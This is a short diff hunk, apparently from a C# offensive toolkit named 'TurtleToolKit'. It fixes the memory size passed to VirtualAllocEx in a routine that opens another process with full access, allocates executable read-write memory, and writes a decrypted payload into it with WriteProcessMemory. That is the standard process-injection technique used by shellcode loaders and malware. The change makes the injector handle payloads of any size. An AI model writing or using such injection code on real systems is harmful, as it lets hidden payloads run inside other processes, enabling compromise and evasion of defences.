@@ -57,7 +57,7 @@ namespace TurtleToolKit
                 int payloadSize = decryptedBytes.Length;
                 IntPtr outSize;
                 IntPtr hProcess = Win32.OpenProcess(0x001F0FFF, false, processId);
-                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadSize, 0x3000, 0x40);
                 if (!Win32.WriteProcessMemory(hProcess, addr, decryptedBytes, payloadSize, out outSize))
                 {
                     Console.WriteLine("failed to write process memory");
